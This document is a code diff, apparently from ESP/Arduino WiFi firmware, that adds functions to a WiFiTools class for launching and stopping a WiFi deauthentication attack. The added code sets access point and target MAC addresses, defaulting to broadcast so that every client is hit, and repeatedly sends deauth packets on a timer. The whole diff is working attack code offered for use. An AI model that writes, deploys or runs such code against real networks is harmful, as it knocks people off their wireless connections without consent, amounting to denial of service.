@@ -550,3 +550,68 @@ void WiFiTools::findClients(uint8_t* networkBSSID = NULL, uint8_t channel = NULL
 
     Serial.println("Client detection complete");
 }
+
+void WiFiTools::startNetworkDeauth(uint8_t* networkSSID = NULL, uint8_t* networkBSSID = NULL, uint8_t channel = NULL, int availableNetworkIndex = -1, uint8_t* targetMacAddr = NULL, int delayMs = 100, uint8_t reasonCode = 2) {
+    uint8_t apMac[6];
+    uint8_t stMac[6];
+    uint8_t targetMac[6];
+
+    // Check if networkSSID, networkBSSID, and channel are provided
+    if (networkSSID != NULL && networkBSSID != NULL && channel != NULL) {
+        // Set the variables for the deauth packet
+        memcpy(apMac, networkBSSID, 6);
+
+        // Set the target MAC address
+        if (targetMacAddr != NULL) {
+            memcpy(targetMac, targetMacAddr, 6);
+        } else {
+            // Set the target MAC address to broadcast
+            memset(targetMac, 0xFF, 6);
+        }
+    } else if (availableNetworkIndex >= 0 && availableNetworkIndex < foundWiFiNetworks.size()) {
+        // Set the variables for the deauth packet
+        memcpy(apMac, foundWiFiNetworks[availableNetworkIndex].bssid, 6);
+
+        // Set the target MAC address
+        if (targetMacAddr != NULL) {
+            memcpy(targetMac, targetMacAddr, 6);
+        } else {
+            // Set the target MAC address to broadcast
+            memset(targetMac, 0xFF, 6);
+        }
+
+        // Set the channel
+        channel = foundWiFiNetworks[availableNetworkIndex].primary;
+    } else {
+        Serial.println("Error: Network information not provided");
+        return;
+    }
+
+    // Set the contents of setDeauthPacket
+    memcpy(setDeauthPacket.apMac, apMac, 6);
+    memcpy(setDeauthPacket.staMac, targetMac, 6);
+    setDeauthPacket.channel = channel;
+    setDeauthPacket.reasonCode = reasonCode;
+    setDeauthPacket.deauthDelayMs = delayMs;
+
+    // Set the wifi_attack_mode flag to DEAUTH
+    attackMode = DEAUTH;
+    Serial.println("Starting deauthentication attack");
+}
+
+void WiFiTools::stopNetworkDeauth() {
+    // Set the wifi_attack_mode flag to WiFi_IDLE
+    attackMode = WiFi_IDLE;
+    Serial.println("Stopping deauthentication attack");
+}
+
+void WiFiTools::runAction() {
+    if (attackMode == DEAUTH) {
+        long currentTime = millis();
+        if (currentTime - lastDeauthTime > setDeauthPacket.deauthDelayMs) {
+            lastDeauthTime = currentTime;
+            // Send the deauth packet
+            sendDeauthPacket(setDeauthPacket.apMac, setDeauthPacket.staMac, setDeauthPacket.channel, setDeauthPacket.reasonCode);
+        }
+    }
+}
